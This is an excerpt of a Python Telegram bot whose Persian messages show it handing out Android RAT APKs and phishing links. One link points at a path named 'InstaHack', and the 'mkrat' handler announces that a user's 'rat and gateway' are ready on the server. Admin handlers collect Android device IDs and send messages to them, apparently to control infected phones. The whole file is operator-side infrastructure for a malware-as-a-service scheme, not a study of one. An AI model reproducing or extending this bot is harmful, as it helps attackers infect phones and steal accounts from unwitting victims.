                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/InstaHack/index.php?user={portuser} \n Getewayport = {portuser}")


        elif (call.data.startswith("mkrat")):
            if one(call.message.chat.id) == '200':
                msg1 = "رات و درگاه شما روی سرور قرار گرفت حالا میتونی قالبتو انتخاب کنی!"
                portlist = open('data/count.txt', 'r').read()
                bot.send_message(call.message.chat.id,f"{msg1}\n {ChannelLink}")
                #auto_edit_root(message.chat.id)
                auto_edit(call.message.chat.id)
                bot.send_message(call.message.chat.id, f"Your Geteway Port == {portlist}")
                folder_user(call.message.chat.id)
                add_one(call.message.chat.id)
                setpayment(call.message.chat.id)
            else:
                bot.answer_callback_query(callback_query_id=call.id,
                    show_alert=True,
                    text=f":/متسفانه یا خوشبختانه تو راتتو ساختی نیاز نیست 10 بار بزنی رو این !")



        elif (call.data.startswith("adsend")):
            if call.message.chat.id in admin_sender:
                if not os.path.exists(f'./admin/androidid_{call.message.chat.id}.txt'):
                    with open(f'./admin/androidid_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    with open(f'./admin/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("hi")
                    bot.send_message(call.message.chat.id, "your Path file not exists i make file please TryAgain!")
                else:
                    senderrrr = bot.reply_to(call.message, 'Please send me your Topic !')
                    bot.register_next_step_handler(senderrrr, sender_config)

        elif (call.data.startswith("adtext")):
            if call.message.chat.id in admin_sender:
                input_text = bot.send_message(call.message.chat.id, 'Please send me your text message !')
                bot.register_next_step_handler(input_text, messagef_admin)

        elif (call.data.startswith("adid")):
            if call.message.chat.id in admin_sender:
                input_text = bot.send_message(call.message.chat.id, 'please Send me your Mobile-ID !')
                bot.register_next_step_handler(input_text, androidid_admin)

        elif (call.data.startswith("adlist")):
            if call.message.chat.id in admin_sender:
                senderrrr = bot.reply_to(call.message, 'Please send me your Topic !')
                bot.register_next_step_handler(senderrrr, send_admin_topic)



bot.infinity_polling()

#u can use while loop for this polling 
   
        
